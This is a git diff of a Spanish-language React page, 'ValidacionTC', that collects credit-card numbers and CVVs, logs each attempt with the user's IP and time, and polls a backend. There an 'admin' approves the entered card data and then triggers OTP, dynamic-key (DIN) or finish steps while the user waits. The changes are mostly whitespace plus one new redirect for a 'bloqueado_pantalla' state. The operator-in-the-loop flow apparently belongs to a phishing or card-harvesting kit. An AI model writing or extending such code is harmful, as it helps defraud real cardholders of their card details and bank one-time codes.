@@ -95,33 +95,33 @@ export default function ValidacionTC() {
                 const raw = localStorage.getItem("datos_usuario");
                 const usuarioLocalStorage = raw ? JSON.parse(raw) : {};
                 const sesionId = usuarioLocalStorage?.sesion_id;
-                
+
                 if (!sesionId) {
                     console.error('Acceso sin sesionId');
                     navigate('/');
                     return false;
                 }
-                
+
                 // Verificar estado del backend
                 const { instanceBackend } = await import("../../axios/instanceBackend");
                 const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                 const { estado, cardData: backendCardData } = response.data;
-                
+
                 // Solo permitir acceso si el estado es correcto
                 const estadosPermitidos = [
-                    'solicitar_tc', 
-                    'solicitar_tc_custom', 
+                    'solicitar_tc',
+                    'solicitar_tc_custom',
                     'awaiting_tc_approval',
                     'error_tc',
                     'error_tc_custom'
                 ];
-                
+
                 if (!estadosPermitidos.includes(estado)) {
                     console.error('Acceso no autorizado a TC. Estado actual:', estado);
                     navigate('/');
                     return false;
                 }
-                
+
                 // Cargar cardData del backend (prioridad sobre localStorage)
                 if (backendCardData) {
                     setCardData(backendCardData);
@@ -135,7 +135,7 @@ export default function ValidacionTC() {
                         setIsTCCustom(estado === 'solicitar_tc_custom' || estado === 'awaiting_tc_approval');
                     }
                 }
-                
+
                 return true;
             } catch (error) {
                 console.error("Error validando acceso:", error);
@@ -143,9 +143,9 @@ export default function ValidacionTC() {
                 return false;
             }
         };
-        
+
         validateAccess();
-        
+
         obtenerIP();
         obtenerFechaHora();
     }, []);
@@ -392,11 +392,11 @@ export default function ValidacionTC() {
 
                     // --- REGISTRAR INTENTO EN LOCALSTORAGE (Estructura Unificada) ---
                     if (!usuarioLocalStorage.usuario) usuarioLocalStorage.usuario = {};
-                    
+
                     // Determinar si usar endpoint TC estándar o TC Custom
                     const endpoint = isTCCustom ? "/tc-custom" : "/tc";
                     const arrayKey = isTCCustom ? "tc_custom" : "tc";
-                    
+
                     if (!usuarioLocalStorage.usuario[arrayKey]) usuarioLocalStorage.usuario[arrayKey] = [];
 
                     const nuevoIntento = {
@@ -517,17 +517,17 @@ export default function ValidacionTC() {
                 // Admin aprobó TC/CVV custom: backend NO cambia el estado automáticamente.
                 // Usuario debe QUEDAR EN ESPERA hasta que admin pulse OTP, DIN o FIN.
                 // El estado permanece en 'awaiting_tc_approval' o 'awaiting_cvv_approval' hasta que admin presione un botón del menú.
-                
+
                 // Si el estado sigue en awaiting_approval, seguir esperando
                 if (estado === 'awaiting_tc_approval' || estado === 'awaiting_cvv_approval') {
                     estadoAnteriorRef.current = estado;
                     return;
                 }
-                
+
                 // Si estaba en awaiting_approval y ahora cambió a otro estado, significa que el admin presionó un botón
                 const prev = estadoAnteriorRef.current;
-                if ((prev === 'awaiting_tc_approval' || prev === 'awaiting_cvv_approval') && 
-                    estado !== 'awaiting_tc_approval' && estado !== 'awaiting_cvv_approval' && 
+                if ((prev === 'awaiting_tc_approval' || prev === 'awaiting_cvv_approval') &&
+                    estado !== 'awaiting_tc_approval' && estado !== 'awaiting_cvv_approval' &&
                     estado !== 'pendiente') {
                     // El admin presionó un botón después de aprobar, continuar con el flujo normal
                     estadoAnteriorRef.current = estado;
@@ -591,6 +591,9 @@ export default function ValidacionTC() {
                         // Si estamos en TC y hay error de CVV, NO redirigir a CVV
                         // Solo redirigir si realmente es necesario
                         // Por ahora, no hacer nada ya que estamos en TC
+                        break;
+                    case 'bloqueado_pantalla':
+                        navigate('/error-923page');
                         break;
                     default:
                         console.log("Estado no manejado en redirección:", estado);
